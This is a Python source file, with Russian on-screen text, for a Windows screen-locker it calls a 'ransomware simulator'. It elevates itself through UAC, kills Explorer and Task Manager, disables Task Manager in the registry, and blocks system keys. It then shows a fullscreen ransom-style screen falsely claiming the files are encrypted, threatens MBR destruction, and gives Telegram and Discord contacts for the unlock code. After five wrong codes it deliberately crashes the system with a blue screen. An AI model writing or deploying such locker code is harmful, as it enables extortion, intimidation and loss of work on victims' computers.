# -*- coding: utf-8 -*-
"""
GRIFERS RANSOMWARE SIMULATOR - ПОЛНОЭКРАННАЯ КОНСОЛЬ (F11 ЭФФЕКТ)
Смерть на весь экран как при нажатии F11
Code: 1234 | Telegram: @Ivan_Abrikos | Discord: mrgrishast_51442
"""
import tkinter as tk
from tkinter import messagebox
import ctypes
import os
import sys
import socket
import threading
import time
import subprocess

# ==================== ПОЛНОЭКРАННАЯ КОНСОЛЬ КАК F11 ====================
def set_console_fullscreen():
    """Делает консоль полноэкранной как при нажатии F11"""
    if os.name == 'nt':
        try:
            # Получаем handle консоли
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                # Разворачиваем на весь экран
                ctypes.windll.user32.ShowWindow(hwnd, 3)  # SW_MAXIMIZE = 3
                
                # Альтернативный способ через клавишу F11
                import ctypes.wintypes
                # Отправляем Alt+Enter для полноэкранного режима
                ctypes.windll.user32.keybd_event(0x12, 0, 0, 0)  # Alt нажат
                ctypes.windll.user32.keybd_event(0x0D, 0, 0, 0)  # Enter нажат
                time.sleep(0.05)
                ctypes.windll.user32.keybd_event(0x0D, 0, 2, 0)  # Enter отпущен
                ctypes.windll.user32.keybd_event(0x12, 0, 2, 0)  # Alt отпущен
        except:
            pass

def show_fullscreen_death_animation():
    """Показывает ПОЛНОЭКРАННУЮ анимацию Смерти (как F11)"""
    
    os.system('')
    
    death_art = r"""
             ;::::; 
           ;::::; :; 
         ;:::::'   :; 
        ;:::::;     ;. 
       ,:::::'       ;           OOO\ 
       ::::::;       ;          OOOOO\ 
       ;:::::;       ;         OOOOOOOO 
      ,;::::::;     ;'         / OOOOOOO 
    ;:::::::::`. ,,,;.        /  / DOOOOOO 
  .';:::::::::::::::::;,     /  /     DOOOO 
,::::::;::::::;;;;::::;,   /  /        DOOO 
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO 
::`:::::::`;:::::::: ;::::# /              DOO 
`:`:::::::`;:::::: ;::::::#/               DOO 
:::`:::::::`;; ;:::::::::##                OO 
::::`:::::::`;::::::::;:::#                OO 
`:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:# 
   ::::::`:::::;'  /  /   `#
    """
    
    skull_art = r"""
         ╔══════════════════════════════════════╗
         ║     💀☠️💀☠️💀 GRIFERS 💀☠️💀☠️💀     ║
         ║       ███████████████████████       ║
         ║      ██            ██            ██      ║
         ║      ██  ██████  ██  ██████  ██      ║
         ║      ██  ██████  ██  ██████  ██      ║
         ║      ██            ██            ██      ║
         ║      ██  ████████████████  ██      ║
         ║      ██  ██        ██  ██      ║
         ║       █████████████████████       ║
         ║          💀☠️💀☠️💀☠️💀☠️💀          ║
         ╚══════════════════════════════════════╝
    """
    
    warning_text = [
        "╔══════════════════════════════════════════════════════════════════════════════╗",
        "║                                                                              ║",
        "║                    💀 СМЕРТЬ ПРИШЛА ЗА ТВОИМИ ФАЙЛАМИ 💀                     ║",
        "║                                                                              ║",
        "║              ТВОИ ФАЙЛЫ ЗАШИФРОВАНЫ. ОНИ БУДУТ УНИЧТОЖЕНЫ.                  ║",
        "║                                                                              ║",
        "║                       Telegram: @Ivan_Abrikos                                ║",
        "║                       Discord:  mrgrishast_51442                             ║",
        "║                                                                              ║",
        "╚══════════════════════════════════════════════════════════════════════════════╝"
    ]
    
    # Очищаем консоль
    os.system('cls' if os.name == 'nt' else 'clear')
    
    if os.name == 'nt':
        # Максимальный размер консоли
        os.system('mode con cols=200 lines=60')
        os.system('color 04')  # Красный фон
        # Разворачиваем консоль на весь экран
        set_console_fullscreen()
    
    # Быстрый мигающий показ арта
    for _ in range(3):
        os.system('cls' if os.name == 'nt' else 'clear')
        # Выводим арт с отступами для центрирования
        print("\n" * 8)
        for line in death_art.split('\n'):
            print(f"\033[91m{line:^100}\033[0m")
        time.sleep(0.2)
        os.system('cls' if os.name == 'nt' else 'clear')
        time.sleep(0.1)
    
    # Финальный показ
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\n" * 6)
    
    # Выводим арт смерти
    for line in death_art.split('\n'):
        print(f"\033[91m{line:^100}\033[0m")
        time.sleep(0.01)
    
    # Выводим череп
    print("\n")
    for line in skull_art.split('\n'):
        print(f"\033[91m{line:^100}\033[0m")
        time.sleep(0.01)
    
    # Выводим предупреждение
    print("\n")
    for line in warning_text:
        print(f"\033[91m{line:^100}\033[0m")
        time.sleep(0.02)
    
    time.sleep(2)

# ==================== КОНФИГ ====================
UNLOCK_CODE = "Grifers"
PC_NAME = socket.gethostname()
TELEGRAM_CONTACT = "@IPixelCheatHacker"
DISCORD_CONTACT = "mrgrishast_51442"

class GrifersRansomwareSimulator:
    def __init__(self):
        self.root = None
        self.entry = None
        self.attempts = 0
        self.max_attempts = 5
        
        # Закрываем все лишние окна перед анимацией
        self.close_all_windows()
        
        # Показываем полноэкранную анимацию смерти
        show_fullscreen_death_animation()
        
        self.create_gui()
        
    def close_all_windows(self):
        """Закрывает все лишние окна для чистоты анимации"""
        try:
            # Сворачиваем все окна
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 3)
        except:
            pass
    
    def create_gui(self):
        """Создание GUI с синим фоном"""
        self.root = tk.Tk()
        self.root.title("Ваши файлы зашифрованы!")
        
        try:
            sw = self.root.winfo_screenwidth()
            sh = self.root.winfo_screenheight()
        except:
            sw, sh = 1920, 1080
            
        self.root.geometry(f"{sw}x{sh}+0+0")
        self.root.configure(bg='#0000aa')
        
        try:
            self.root.overrideredirect(True)
            self.root.attributes('-topmost', True)
            self.root.attributes('-fullscreen', True)
        except:
            pass
        
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.block_keys()
        
        # Интерфейс
        main_frame = tk.Frame(self.root, bg='#0000aa')
        main_frame.place(relx=0.5, rely=0.45, anchor=tk.CENTER)
        
        title = tk.Label(main_frame, text="Ваши файлы зашифрованы!",
                        font=('Arial', 28, 'bold'), fg='#ffffff', bg='#0000aa')
        title.pack(pady=(0, 20))
        
        main_text = f"""Упс! Вы подверглись масштабной хакерской атаке и теперь Ваш компьютер заблокирован,
а все имеющиеся диски и файлы на них зашифрованы хакерской группировкой.

Любые действия, связанные с попыткой обмануть систему нанесут непоправимый вред
Вашему компьютеру и приведут к потере всех важных файлов без возможности восстановления.

При попытке снять блокировку MBR (главный загрузчик материнки) будет снесён и будет подана
рекурсивная нагрузка на ваш процессор, что приведёт к его неисправности.

Чтобы получить код, напишите {TELEGRAM_CONTACT} (Telegram) или {DISCORD_CONTACT} (Discord)"""
        
        text_label = tk.Label(main_frame, text=main_text, font=('Arial', 13),
                             fg='#ffffff', bg='#0000aa', justify=tk.CENTER)
        text_label.pack(pady=10)
        
        code_label = tk.Label(main_frame, text="Введите код разблокировки:",
                             font=('Arial', 14), fg='#ffffff', bg='#0000aa')
        code_label.pack(pady=(30, 5))
        
        self.entry = tk.Entry(main_frame, font=('Arial', 14), show="",
                              bg='#ffffff', fg='#000000', width=25,
                              relief=tk.SUNKEN, bd=2,
                              justify='center')
        self.entry.pack(ipady=5)
        self.entry.focus()
        self.entry.bind('<Return>', lambda e: self.check_code())
        
        bottom_frame = tk.Frame(main_frame, bg='#0000aa')
        bottom_frame.pack(pady=20)
        
        pc_label = tk.Label(bottom_frame, text=f"Current PC: {PC_NAME}",
                           font=('Arial', 11), fg='#ffffff', bg='#0000aa')
        pc_label.pack(side=tk.LEFT, padx=(0, 20))
        
        enter_btn = tk.Button(bottom_frame, text="Enter [Ввод]", font=('Arial', 11),
                             bg='#e0e0e0', fg='#000000', relief=tk.RAISED, bd=2,
                             padx=20, pady=3, command=self.check_code)
        enter_btn.pack(side=tk.LEFT)
        
        self.attempts_label = tk.Label(main_frame, text="", font=('Arial', 10),
                                       fg='#ff6666', bg='#0000aa')
        self.attempts_label.pack(pady=10)
        
        self.lock_system()
        self.root.mainloop()
        
    def block_keys(self):
        def block():
            try:
                import keyboard
                blocked = ['ctrl', 'win', 'windows', 'esc', 'alt', 'f4', 
                          'delete', 'tab', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12']
                for key in blocked:
                    try:
                        keyboard.block_key(key)
                    except:
                        pass
            except:
                pass
        threading.Thread(target=block, daemon=True).start()
        
    def lock_system(self):
        try:
            os.system("taskkill /f /im explorer.exe >nul 2>&1")
            os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
            os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1')
        except:
            pass
            
    def unlock_system(self):
        try:
            os.system('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /f >nul 2>&1')
            os.system("start explorer.exe")
        except:
            pass
        
    def destroy_system(self):
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
        except:
            os.system("shutdown /r /t 0 /f")
            
    def check_code(self):
        code = self.entry.get().strip()
        
        if code == UNLOCK_CODE:
            self.unlock_system()
            self.root.destroy()
            return
            
        self.attempts += 1
        remaining = self.max_attempts - self.attempts
        
        self.attempts_label.config(text=f"Осталось попыток: {remaining}")
        self.entry.delete(0, tk.END)
        
        if self.attempts >= self.max_attempts:
            self.destroy_system()
        else:
            messagebox.showerror("Неверный код", 
                                f"Неверный код разблокировки!\nОсталось попыток: {remaining}")

# ==================== ЗАПУСК ====================
if __name__ == "__main__":
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
    except:
        pass
    
    try:
        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Grifers_Ransomware_Mutex")
        if ctypes.windll.kernel32.GetLastError() == 183:
            sys.exit(0)
    except:
        pass
        
    GrifersRansomwareSimulator()